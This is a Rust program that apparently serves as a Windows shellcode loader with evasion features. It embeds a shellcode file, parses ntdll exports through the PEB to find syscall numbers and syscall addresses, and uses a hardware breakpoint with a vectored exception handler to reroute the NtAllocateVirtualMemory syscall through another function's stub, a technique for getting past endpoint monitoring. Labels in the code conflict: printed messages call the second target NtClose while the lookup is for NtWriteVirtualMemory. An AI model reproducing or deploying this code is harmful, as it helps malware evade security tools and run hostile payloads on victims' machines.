#![allow(non_snake_case)]
use std::{
    ffi::CStr,
    mem::{transmute, zeroed},
    os::raw::c_void,
    ptr::null_mut,
};

use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
use windows_sys::Win32::{
    Foundation::{EXCEPTION_ACCESS_VIOLATION, EXCEPTION_SINGLE_STEP},
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
            EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
            GetThreadContext, IMAGE_NT_HEADERS64, PORT_DRIVER_INTERNAL, SetThreadContext,
        },
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
        SystemServices::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
        },
        Threading::GetCurrentThread,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
static mut NT_ALLOC_SYSCALL_ADDR: *mut c_void = null_mut();
static mut NT_CLOSE_SYSCALL_ADDR: *mut c_void = null_mut();

type NtAllocateVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

fn get_current_teb() -> PTEB {
    unsafe {
        let mut teb: PTEB = null_mut();
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb
        );
        teb
    }
}

fn find_sysaddr(function_name: &str, sys_addr: &mut *mut c_void) {
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            print!("[-] Invalid PEB");
            return;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:?}", ntdll_base);

        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            print!("[-] Invalid DOS header");
            return;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            print!("[-] Invalid NT header");
            return;
        }

        let export_dir = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions =
            (ntdll_base as *const u8).add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let address_of_names =
            (ntdll_base as *const u8).add((*export_dir).AddressOfNames as usize) as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_dir).AddressOfNameOrdinals as usize)
            as *const u16;

        for i in 0..(*export_dir).NumberOfNames as isize {
            let name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_dir).NumberOfFunctions as usize {
                continue;
            }

            let func_rva = *address_of_functions.offset(ordinal as isize);
            let func_addr = (ntdll_base as *const u8).add(func_rva as usize);

            let c_str = CStr::from_ptr(name);

            if let Ok(func_name) = c_str.to_str() {
                if function_name.eq_ignore_ascii_case(func_name) {
                    println!("[+] Found {} at address: {:?}", func_name, func_addr);

                    let bytes = func_addr as *const u8;

                    for i in 0..32 {
                        if *bytes.offset(i) == 0x4c
                            && *bytes.offset(i + 1) == 0x8b
                            && *bytes.offset(i + 2) == 0xd1
                            && *bytes.offset(i + 3) == 0xb8
                            && *bytes.offset(i + 6) == 0x00
                            && *bytes.offset(i + 7) == 0x00
                        {
                            let low = *bytes.offset(i + 4) as u32;
                            let high = *bytes.offset(i + 5) as u32;

                            let ssn = ((high << 8) | low) as i32;
                            *sys_addr = func_addr.add(18 as usize) as *mut c_void;

                            println!("[+] {} has SSN: 0x{:X}", func_name, ssn);
                            println!("[+] Syscall address: {:?}", *sys_addr);
                            return;
                        }
                    }
                }
            }
        }
    }
    // ssn
}

fn get_ssn(function_name: &str) -> i32 {
    let mut ssn: i32 = 0;
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            print!("[-] Invalid PEB");
            return ssn;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:?}", ntdll_base);

        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            print!("[-] Invalid DOS header");
            return ssn;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            print!("[-] Invalid NT header");
            return ssn;
        }

        let export_dir = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions =
            (ntdll_base as *const u8).add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let address_of_names =
            (ntdll_base as *const u8).add((*export_dir).AddressOfNames as usize) as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_dir).AddressOfNameOrdinals as usize)
            as *const u16;

        for i in 0..(*export_dir).NumberOfNames as isize {
            let name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_dir).NumberOfFunctions as usize {
                continue;
            }

            let func_rva = *address_of_functions.offset(ordinal as isize);
            let func_addr = (ntdll_base as *const u8).add(func_rva as usize);

            let c_str = CStr::from_ptr(name);

            if let Ok(func_name) = c_str.to_str() {
                if function_name.eq_ignore_ascii_case(func_name) {
                    println!("[+] Found {} at address: {:?}", func_name, func_addr);

                    let bytes = func_addr as *const u8;

                    for i in 0..32 {
                        if *bytes.offset(i) == 0x4c
                            && *bytes.offset(i + 1) == 0x8b
                            && *bytes.offset(i + 2) == 0xd1
                            && *bytes.offset(i + 3) == 0xb8
                            && *bytes.offset(i + 6) == 0x00
                            && *bytes.offset(i + 7) == 0x00
                        {
                            let low = *bytes.offset(i + 4) as u32;
                            let high = *bytes.offset(i + 5) as u32;

                            ssn = ((high << 8) | low) as i32;
                            let sys_addr = func_addr.add(18 as usize) as *mut c_void;

                            println!("[+] {} has SSN: 0x{:X}", func_name, ssn);
                            println!("[+] Syscall address: {:?}", sys_addr);
                            return ssn;
                        }
                    }
                }
            }
        }
    }
    ssn
}

fn set_hwbp(thread_handle: *mut c_void, addr: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = addr as u64,
            1 => context.Dr1 = addr as u64,
            2 => context.Dr2 = addr as u64,
            3 => context.Dr3 = addr as u64,
            _ => return false,
        }

        let local_enable_bit = 1u64 << (reg_index * 2);
        context.Dr7 |= local_enable_bit; // Enable the breakpoint
        context.Dr7 &= !(0x3 << (16 + reg_index * 4)); // Clear the RW bits
        context.Dr7 &= !(0x3 << (18 + reg_index * 4)); // Clear the LEN bits

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

fn rm_hwbp(thread_handle: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = 0,
            1 => context.Dr1 = 0,
            2 => context.Dr2 = 0,
            3 => context.Dr3 = 0,
            _ => return false,
        }

        context.Dr7 &= !(1 << (reg_index * 2)); // Disable the breakpoint

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP {
            if (*(*exception_info).ExceptionRecord).ExceptionAddress == NT_ALLOC_SYSCALL_ADDR {
                println!(
                    "[+] VEH Triggered: NtAllocateVirtualMemory Syscall: {:?}",
                    (*(*exception_info).ExceptionRecord).ExceptionAddress
                );

                (*(*exception_info).ContextRecord).Rip = NT_CLOSE_SYSCALL_ADDR as u64;

                (*(*exception_info).ContextRecord).EFlags |= 0x10000;

                return EXCEPTION_CONTINUE_EXECUTION;
            }

            return EXCEPTION_CONTINUE_SEARCH;
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }
}

fn get_nt_function(function_name: &str) -> *mut c_void {
    let func_addr: *mut c_void = null_mut();

    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            print!("[-] Invalid PEB");
            return func_addr;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:?}", ntdll_base);

        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            print!("[-] Invalid DOS header");
            return func_addr;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            print!("[-] Invalid NT header");
            return func_addr;
        }

        let export_dir = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions =
            (ntdll_base as *const u8).add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let address_of_names =
            (ntdll_base as *const u8).add((*export_dir).AddressOfNames as usize) as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_dir).AddressOfNameOrdinals as usize)
            as *const u16;

        for i in 0..(*export_dir).NumberOfNames as isize {
            let name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_dir).NumberOfFunctions as usize {
                continue;
            }

            let func_rva = *address_of_functions.offset(ordinal as isize);
            let func_addr = (ntdll_base as *const u8).add(func_rva as usize);

            let c_str = CStr::from_ptr(name);

            if let Ok(func_name) = c_str.to_str() {
                if func_name.eq_ignore_ascii_case(function_name) {
                    println!("[+] Found {} at address: {:?}", func_name, func_addr);
                    return func_addr as *mut c_void;
                }
            }
        }
    }

    func_addr
}

/*

    SysCall NtAllocateVirtualMemory
    -> VEH, trigger Hardware Breakpoint at syscall instruction
    -> Change syscalladdr or NtAllocateVirtualMemory to NtClose or some other ntfunction

    Things Required
    -> NTAllocateVirtualMemory Prototype
    -> NtAllocateVirtualMemory Function Addr
    -> NtClose Syscall Addr

    Flow
    -> Find NtAllocateVirtualMemory Function Addr
    -> Find NtAllocateVirtualMemory Syscall Addr
    -> Find NtClose Syscall Addr
    -> Set Hardware Breakpoint at NtAllocateVirtualMemory Syscall Addr
    -> Call NtAllocateVirtualMemory func

    Globals
    -> NtAllocateVirtualMemory Syscall Addr
    -> NtClose Syscall Addr
*/

fn pause() {
    use std::io::{self, Write};

    print!("Press Enter to continue...");
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    unsafe {
        let NtAllocateVirtualMemory: NtAllocateVirtualMemory =
            transmute(get_nt_function("NtAllocateVirtualMemory"));

        let mut sys_addr = null_mut();

        find_sysaddr("NtAllocateVirtualMemory", &mut sys_addr);
        NT_ALLOC_SYSCALL_ADDR = sys_addr;
        if sys_addr.is_null() {
            println!("[-] Failed to find NtAllocateVirtualMemory syscall address");
            return;
        }
        println!(
            "[+] NtAllocateVirtualMemory syscall address: {:?}",
            sys_addr
        );

        find_sysaddr("NtWriteVirtualMemory", &mut sys_addr);
        NT_CLOSE_SYSCALL_ADDR = sys_addr;
        if sys_addr.is_null() {
            println!("[-] Failed to find NtWriteVirtualMemory syscall address");
            return;
        }
        println!("[+] NtClose syscall address: {:?}", sys_addr);

        // pause();

        let mut base_address: *mut c_void = null_mut();
        let mut size = SHELLCODE.len();

        AddVectoredExceptionHandler(1, Some(exception_handler));

        set_hwbp(GetCurrentThread(), NT_ALLOC_SYSCALL_ADDR, 0);
        let status = NtAllocateVirtualMemory(
            -1isize as *mut c_void,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        rm_hwbp(GetCurrentThread(), 0);

        if status != 0 {
            println!("[-] Failed to allocate memory");
            return;
        }

        println!(
            "[+] Allocated {} bytes at {:p}",
            SHELLCODE.len(),
            base_address
        );
    }
}
